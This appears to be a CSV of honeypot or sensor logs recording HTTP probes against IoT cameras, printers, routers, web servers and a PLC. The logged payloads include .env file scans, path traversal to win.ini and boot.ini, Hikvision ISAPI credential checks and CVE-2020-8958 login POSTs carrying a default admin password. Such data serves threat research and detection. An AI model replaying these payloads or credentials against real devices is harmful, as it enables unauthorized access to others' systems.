local_ip,remote_ip,remote_port,local_port,tag_label,attack_time,target_profile,node_id,ASN,attack_data,method,path,User-Agent,Accept-Encoding,Accept,Qualys-Scan,Content-Length,Content-Type,Referrer,Host,body
14.139.196.68,94.156.67.93,63272,80,Unsecured_ENV_file_scan,2023-11-03T20:49:58,device:iot:IPCamera:Hikvision,142,AS394711,"{'method': 'GET', 'path': '/old/.env', 'headers': {'Host': '14.139.196.68', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/old/.env,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36","gzip, deflate",*/*,,,,,14.139.196.68,
14.139.196.68,94.156.67.93,63272,80,Unsecured_ENV_file_scan,2023-11-03T20:49:58,device:iot:IPCamera:Hikvision,142,AS394711,"{'method': 'GET', 'path': '/local/.env', 'headers': {'Host': '14.139.196.68', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/local/.env,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36","gzip, deflate",*/*,,,,,14.139.196.68,
117.250.192.116,45.128.232.152,56126,8080,CID-1193,2023-11-04T00:04:13,device:web:server:Apache,390,AS202685,"{'method': 'CONNECT', 'path': 'google.com:443', 'headers': {'Host': 'google.com:443', 'User-Agent': 'Go-http-client/1.1'}}",CONNECT,google.com:443,Go-http-client/1.1,,,,,,,google.com:443,
43.229.101.242,66.240.236.119,41500,80,CID-984,2023-11-04T00:46:34,device:iot:IPCamera:Hikvision,355,AS10439,"{'method': 'GET', 'path': '/.well-known/security.txt', 'headers': {'Host': '43.229.101.242', 'Accept-Encoding': 'identity'}}",GET,/.well-known/security.txt,,identity,,,,,,43.229.101.242,
103.118.160.226,45.43.19.29,46726,80,Unsecured_ENV_file_scan,2023-11-04T05:43:47,device:iot:Printer:Canon,74,AS397423,"{'method': 'GET', 'path': '/.env', 'headers': {'Host': '103.118.160.226', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/.env,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36","gzip, deflate",*/*,,,,,103.118.160.226,
172.16.16.99,159.65.188.63,55338,80,CID-1149,2023-11-04T05:49:32,device:iot:IPCamera:Avtech,432,AS14061,"{'method': 'GET', 'path': '/form.html', 'headers': {'Host': '103.58.121.99', 'User-Agent': 'curl/8.1.2', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/form.html,curl/8.1.2,gzip,*/*,,,,,103.58.121.99,
103.94.204.249,45.43.19.29,53514,80,Unsecured_ENV_file_scan,2023-11-04T04:46:35,device:iot:IPCamera:D-Link-DCS-5222L,397,AS397423,"{'method': 'GET', 'path': '/.env', 'headers': {'Host': '103.94.204.249', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/.env,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36","gzip, deflate",*/*,,,,,103.94.204.249,
10.0.176.23,45.83.220.211,57464,80,Hikvision_IP_camera_scan,2023-11-04T06:03:39,device:iot:IPCamera:Hikvision,89,AS39351,"{'method': 'GET', 'path': '/ISAPI/Security/userCheck', 'headers': {'Host': '103.160.128.203:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_2_9; en-US) AppleWebKit/536.14 (KHTML, like Gecko) Chrome/47.0.3990.175 Safari/603', 'Authorization': 'Basic dXNlcjphMTIzNDU2', 'Connection': 'close', 'Accept-Encoding': 'gzip'}}",GET,/ISAPI/Security/userCheck,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_2_9; en-US) AppleWebKit/536.14 (KHTML, like Gecko) Chrome/47.0.3990.175 Safari/603",gzip,,,,,,103.160.128.203:80,
10.0.176.23,45.83.220.211,57464,80,Hikvision_IP_camera_scan,2023-11-04T05:51:09,device:iot:IPCamera:Hikvision,89,AS39351,"{'method': 'GET', 'path': '/ISAPI/Security/userCheck', 'headers': {'Host': '103.160.128.203:80', 'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_2_9; en-US) AppleWebKit/536.14 (KHTML, like Gecko) Chrome/47.0.3990.175 Safari/603', 'Authorization': 'Basic dXNlcjphMTIzNDU2', 'Connection': 'close', 'Accept-Encoding': 'gzip'}}",GET,/ISAPI/Security/userCheck,"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 7_2_9; en-US) AppleWebKit/536.14 (KHTML, like Gecko) Chrome/47.0.3990.175 Safari/603",gzip,,,,,,103.160.128.203:80,
192.168.130.8,206.189.94.60,52454,80,CID-1032,2023-11-04T07:01:46,device:iot:IPCamera:Panasonic,448,AS14061,"{'method': 'GET', 'path': '/password.php', 'headers': {'Host': '112.133.242.125', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Accept': '*/*', 'Accept-Encoding': 'gzip'}}",GET,/password.php,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",gzip,*/*,,,,,112.133.242.125,
103.94.204.251,141.105.66.213,47556,8080,CID-1007,2023-11-04T06:19:47,device:web:server:Apache,397,AS50867,"{'method': 'GET', 'path': '/start.html', 'headers': {'Host': '103.94.204.251:8080', 'Connection': 'close', 'User-Agent': 'curl/7.54.0'}}",GET,/start.html,curl/7.54.0,,,,,,,103.94.204.251:8080,
103.94.204.251,141.105.66.213,48890,8080,CID-1411,2023-11-04T06:19:47,device:web:server:Apache,397,AS50867,"{'method': 'GET', 'path': '/start.html', 'headers': {'Host': '103.94.204.251:8080', 'Connection': 'close', 'User-Agent': 'curl/7.54.0'}}",GET,/start.html,curl/7.54.0,,,,,,,103.94.204.251:8080,
111.235.68.59,62.133.60.96,57806,80,CVE-2020-8958,2023-11-03T12:29:59,device:iot:Printer:Canon,314,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '111.235.68.59:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://111.235.68.59:80', 'Connection': 'keep-alive', 'Referer': 'http://111.235.68.59:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,111.235.68.59:80,username=admin&psd=Feefifofum
121.244.94.26,172.104.173.116,39704,80,CID-1290,2023-11-03T13:41:05,device:iot:IPCamera:MOBOTIXCamera,479,AS63949,"{'method': 'GET', 'path': '/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini', 'headers': {'Host': '121.244.94.26', 'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1', 'Accept-Language': 'en', 'Connection': 'Close', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Pragma': 'no-cache', 'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*'}}",GET,/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/windows/win.ini,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),,"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",,,,,121.244.94.26,
121.244.94.22,172.104.173.116,37596,80,CID-1211,2023-11-03T13:34:58,device:iot:IPCamera:DNVRS-Web,479,AS63949,"{'method': 'GET', 'path': '//admincp/login.php', 'headers': {'Host': '121.244.94.22', 'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1', 'Accept-Language': 'en', 'Connection': 'Keep-Alive', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Pragma': 'no-cache', 'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*'}}",GET,//admincp/login.php,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),,"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",,,,,121.244.94.22,
192.168.130.8,179.43.191.162,54552,80,Unsecured_ENV_file_scan,2023-11-03T15:29:08,device:iot:IPCamera:Panasonic,448,AS51852,"{'method': 'GET', 'path': '/application/.env', 'headers': {'Host': '112.133.242.125', 'Accept': '*/*', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}}",GET,/application/.env,Mozilla/5.0 (Windows NT 10.0; Win64; x64),"gzip, deflate",*/*,,,,,112.133.242.125,
10.2.3.12,103.112.4.214,16746,80,CID-984,2023-11-03T15:47:45,device:iot:IPCamera:Hikvision,11,AS135722,"{'method': 'GET', 'path': '/SilverStream/Meta/Tables/?access-mode=text', 'headers': {'Connection': 'Keep-Alive', 'Host': '202.90.192.68', 'Pragma': 'no-cache', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*', 'Accept-Language': 'en', 'Accept-Charset': 'iso-8859-1,*,utf-8'}}",GET,/SilverStream/Meta/Tables/?access-mode=text,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),,"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",,,,,202.90.192.68,
10.2.3.12,103.112.4.214,16748,80,CID-1163,2023-11-03T15:47:45,device:iot:IPCamera:Hikvision,11,AS135722,"{'method': 'GET', 'path': '/SilverStream/Meta/Tables/?access-mode=text', 'headers': {'Connection': 'Keep-Alive', 'Host': '202.90.192.68', 'Pragma': 'no-cache', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*', 'Accept-Language': 'en', 'Accept-Charset': 'iso-8859-1,*,utf-8'}}",GET,/SilverStream/Meta/Tables/?access-mode=text,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),,"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",,,,,202.90.192.68,
192.168.181.6,103.75.173.27,47968,80,CID-1092,2023-11-03T18:05:53,device:iot:Printer:Epson,480,AS27385,"{'method': 'GET', 'path': '/bea_wls_internal/classes/weblogic/common/internal/VersionInfoFactory$VERSION_INFO_SINGLETON.class', 'headers': {'Host': '203.171.210.238', 'Accept': '*/*'}}",GET,/bea_wls_internal/classes/weblogic/common/internal/VersionInfoFactory$VERSION_INFO_SINGLETON.class,,,*/*,,,,,203.171.210.238,
103.127.141.232,94.156.67.93,53553,80,Unsecured_ENV_file_scan,2023-11-04T00:05:58,device:iot:Printer:HPLaserJet,137,AS394711,"{'method': 'POST', 'path': '/', 'headers': {'Host': '103.127.141.232', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Content-Length': '14', 'Content-Type': 'application/x-www-form-urlencoded'}, 'body': b'MHglNUIlNUQ9cmlkaG8='}",POST,/,"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36","gzip, deflate",*/*,,14,application/x-www-form-urlencoded,,103.127.141.232,0x%5B%5D=ridho
192.168.181.5,103.75.173.27,46709,80,CID-1218,2023-11-04T00:34:44,device:iot:Printer:Canon,480,AS27385,"{'method': 'GET', 'path': '/thatware/thatfile.php', 'headers': {'Host': '203.171.210.237', 'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/thatware/thatfile.php,,,,VM,,,,203.171.210.237,
192.168.181.5,103.75.173.27,49801,80,CID-1295,2023-11-04T00:37:03,device:iot:Printer:Canon,480,AS27385,"{'method': 'GET', 'path': '/2015/users/0/shipping_addresses/2015/users/1/shipping_addresses/2015/users/2/shipping_addresses/2015/users/3/shipping_addresses/2015/users/4/shipping_addresses/2015/users/5/shipping_addresses/2015/users/6/shipping_addresses/2015/users/7/shipping_addresses', 'headers': {'Host': '203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0', 'Accept': 'text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*', 'Accept-Language': 'en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5', 'Connection': 'keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive', 'Qualys-Scan': 'VM, VM, VM, VM, VM, VM, VM, VM'}}",GET,/2015/users/0/shipping_addresses/2015/users/1/shipping_addresses/2015/users/2/shipping_addresses/2015/users/3/shipping_addresses/2015/users/4/shipping_addresses/2015/users/5/shipping_addresses/2015/users/6/shipping_addresses/2015/users/7/shipping_addresses,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0",,"text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*","VM, VM, VM, VM, VM, VM, VM, VM",,,,"203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237",
192.168.181.5,103.75.173.27,49801,80,CID-1295,2023-11-04T00:37:03,device:iot:Printer:Canon,480,AS27385,"{'method': 'GET', 'path': '/2015/users/0/shipping_addresses/2015/users/1/shipping_addresses/2015/users/2/shipping_addresses/2015/users/3/shipping_addresses/2015/users/4/shipping_addresses/2015/users/5/shipping_addresses/2015/users/6/shipping_addresses/2015/users/7/shipping_addresses', 'headers': {'Host': '203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0', 'Accept': 'text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*', 'Accept-Language': 'en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5, en-US,en;q=0.5', 'Connection': 'keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive, keep-alive', 'Qualys-Scan': 'VM, VM, VM, VM, VM, VM, VM, VM'}}",GET,/2015/users/0/shipping_addresses/2015/users/1/shipping_addresses/2015/users/2/shipping_addresses/2015/users/3/shipping_addresses/2015/users/4/shipping_addresses/2015/users/5/shipping_addresses/2015/users/6/shipping_addresses/2015/users/7/shipping_addresses,"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0, Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0",,"text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*, text/html, application/xhtml+xml, */*","VM, VM, VM, VM, VM, VM, VM, VM",,,,"203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237, 203.171.210.237",
192.168.181.7,103.75.173.27,60481,80,CID-1379,2023-11-04T02:48:13,device:iot:IPCamera:Panasonic,480,AS27385,"{'method': 'GET', 'path': '/eFront/', 'headers': {'Host': '203.171.210.241', 'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/eFront/,,,,VM,,,,203.171.210.241,
192.168.181.7,103.75.173.27,60481,80,CID-1379,2023-11-04T02:48:13,device:iot:IPCamera:Panasonic,480,AS27385,"{'method': 'GET', 'path': '/q79w_38jg__.shtml', 'headers': {'Host': '203.171.210.241', 'Connection': 'Keep-Alive', 'Content-Length': '81', 'Qualys-Scan': 'VM'}, 'body': b'PCEtLSNpbmNsdWRlIHZpcnR1YWw9Ii9zY3JpcHRzLy8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9ib290LmluaSItLT4NCg0K'}",GET,/q79w_38jg__.shtml,,,,VM,81,,,203.171.210.241,"<!--#include virtual=""/scripts//../../../../../../../../../../../boot.ini""-->

"
43.229.100.243,103.75.173.4,52087,9200,CID-1277,2023-11-04T04:31:53,device:web:database:elasticsearch,435,AS27385,"{'method': 'GET', 'path': '/popper_mod/admin/', 'headers': {'Host': '43.229.100.243:9200', 'Connection': 'Keep-Alive', 'Qualys-Scan': 'VM'}}",GET,/popper_mod/admin/,,,,VM,,,,43.229.100.243:9200,
103.57.219.245,115.111.208.180,21301,80,CID-1291,2023-11-04T12:10:29,device:iot:Router:TP-LINK,210,AS4755,"{'method': 'GET', 'path': '/iissamples/issamples/oop/qsumrhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qsumrhit.htw&CiRestriction=none&CiHiliteType=Full', 'headers': {'Host': '103.57.219.245', 'Accept-Charset': 'iso-8859-1,utf-8;q=0.9,*;q=0.1', 'Accept-Language': 'en', 'Connection': 'Close', 'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)', 'Pragma': 'no-cache', 'Accept': 'image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*'}}",GET,/iissamples/issamples/oop/qsumrhit.htw?CiWebHitsFile=/iissamples/issamples/oop/qsumrhit.htw&CiRestriction=none&CiHiliteType=Full,Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0),,"image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",,,,,103.57.219.245,
182.79.70.176,212.192.14.201,42464,80,CID-937,2023-11-04T15:13:06,device:iot:IPCamera:CISCO-WebCam,111,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '182.79.70.176:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 182.79.70.176:80/menu.html', 'Authorization': 'Basic dXNlcjp1c2Vy'}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,182.79.70.176:80,
14.139.82.213,78.153.140.221,49262,80,CID-957,2023-11-04T15:18:04,device:scada:plc:Delta_Electronics,108,AS202306,"{'method': 'GET', 'path': '/test.php', 'headers': {'Host': '14.139.82.213', 'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive'}}",GET,/test.php,,"gzip, deflate",*/*,,,,,14.139.82.213,
172.16.16.102,212.192.14.201,41340,80,CID-937,2023-11-04T16:10:57,device:iot:IPCamera:MOBOTIXCamera,432,AS207713,"{'method': 'GET', 'path': '/zhnping.html', 'headers': {'Host': '103.58.121.102:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Upgrade-Insecure-Requests': '1', 'Referer': 'http:// 103.58.121.102:80/menu.html', 'Authorization': 'Basic Z3Vlc3Q6Z3Vlc3Q='}}",GET,/zhnping.html,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",,,,,103.58.121.102:80,
14.139.252.76,62.133.60.88,43362,80,CVE-2020-8958,2023-11-04T15:23:07,device:iot:IPCamera:Hikvision,124,AS207713,"{'method': 'POST', 'path': '/boaform/admin/formLogin', 'headers': {'Host': '14.139.252.76:80', 'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-GB,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'Content-Type': 'application/x-www-form-urlencoded', 'Content-Length': '29', 'Origin': 'http://14.139.252.76:80', 'Connection': 'keep-alive', 'Referer': 'http://14.139.252.76:80/admin/login.asp', 'Upgrade-Insecure-Requests': '1'}, 'body': b'dXNlcm5hbWU9YWRtaW4mcHNkPUZlZWZpZm9mdW0='}",POST,/boaform/admin/formLogin,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,"gzip, deflate","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",,29,application/x-www-form-urlencoded,,14.139.252.76:80,username=admin&psd=Feefifofum
